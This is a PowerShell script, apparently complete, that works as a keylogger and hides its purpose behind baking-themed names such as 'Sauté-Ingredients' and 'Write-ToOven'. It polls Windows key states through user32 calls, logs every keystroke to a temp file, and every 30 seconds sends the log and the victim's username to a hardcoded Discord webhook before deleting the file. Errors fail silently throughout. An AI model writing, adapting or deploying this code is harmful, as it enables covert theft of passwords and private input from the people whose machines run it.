$pineappleExpress = "https://discord.com/api/webhooks/1287792319067721779/wvStZi9TsQ45RyDIXwxA4XeuQyDDgxQErSpsAaVmjHaszH6VWO4RhUlD7id8JPIMRn_K"
$chocolatePath = "$env:temp\cookie_activity.txt"

$fruitSignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$fruitAPI = Add-Type -MemberDefinition $fruitSignatures -Name 'Fruit' -Namespace Orchard -PassThru

function Get-ChefName {
    $chef = (Get-WmiObject -Class Win32_ComputerSystem).UserName
    return $chef -replace '.*\\', ''
}

function Send-MessageToBakery {
    param (
        [string]$MessageContent
    )

    $chef = Get-ChefName
    $formattedMessage = "Chef: $chef`n$MessageContent"

    try {
        $body = @{ content = $formattedMessage } | ConvertTo-Json
        Invoke-WebRequest -Uri $pineappleExpress -Method Post -ContentType "application/json" -Body $body
    } catch {
        # Handle errors silently
    }
}

function Write-ToOven {
    param (
        [string]$Content
    )

    try {
        $timestamp = Get-Date -Format "HH:mm:ss"
        $entry = "[$timestamp] $Content"
        Add-Content -Path $chocolatePath -Value $entry -Encoding UTF8
    } catch {
        # Handle errors silently
    }
}

function DispatchBakeryContents {
    try {
        if (Test-Path $chocolatePath) {
            $contents = Get-Content -Path $chocolatePath -Raw
            $formattedContents = "Bakery Records:`n" + $contents -replace '\n', "`n"
            Send-MessageToBakery -MessageContent $formattedContents
            Remove-Item -Path $chocolatePath -Force
        } else {
            Send-MessageToBakery -MessageContent "No food in the last 30 seconds."
        }
    } catch {
    }
}

function Sauté-Ingredients {
    $buffer = ""
    $nextSendTime = (Get-Date).AddSeconds(30)

    while ($true) {
        Start-Sleep -Milliseconds 10

        for ($ascii = 8; $ascii -le 254; $ascii++) {
            try {
                $state = $fruitAPI::GetAsyncKeyState($ascii)

                if ($state -eq -32767) {
                    $keyboardState = New-Object Byte[] 256
                    $fruitAPI::GetKeyboardState($keyboardState) | Out-Null
                    $charBuffer = New-Object -TypeName System.Text.StringBuilder

                    switch ($ascii) {
                        8   { $buffer += "[BACKSPACE]" }
                        9   { $buffer += "[TAB]" }
                        13  { 
                            $buffer += "[ENTER]"
                            Write-ToOven -Content $buffer.Trim()
                            $buffer = ""
                        }
                        16  { $buffer += "[SHIFT]" }
                        17  { $buffer += "[CTRL]" }
                        18  { $buffer += "[ALT]" }
                        20  { $buffer += "[CAPSLOCK]" }
                        32  { $buffer += " " }
                        default {
                            if ($fruitAPI::ToUnicode($ascii, 0, $keyboardState, $charBuffer, $charBuffer.Capacity, 0)) {
                                $buffer += $charBuffer.ToString()
                            }
                        }
                    }

                    if ($ascii -eq 32 -or $ascii -eq 8) {
                        Write-ToOven -Content $buffer.Trim()
                        $buffer = ""
                    }
                }
            } catch {
            }
        }

        if ((Get-Date) -ge $nextSendTime) {
            if ($buffer.Length -gt 0) {
                Write-ToOven -Content $buffer.Trim()
                $buffer = ""
            }
            DispatchBakeryContents
            $nextSendTime = (Get-Date).AddSeconds(30)
        }
    }
}

if (-not [System.Diagnostics.Process]::GetProcessesByName("powershell").Where({$_.MainWindowTitle -match 'sauté.ps1'})) {
    Sauté-Ingredients
}
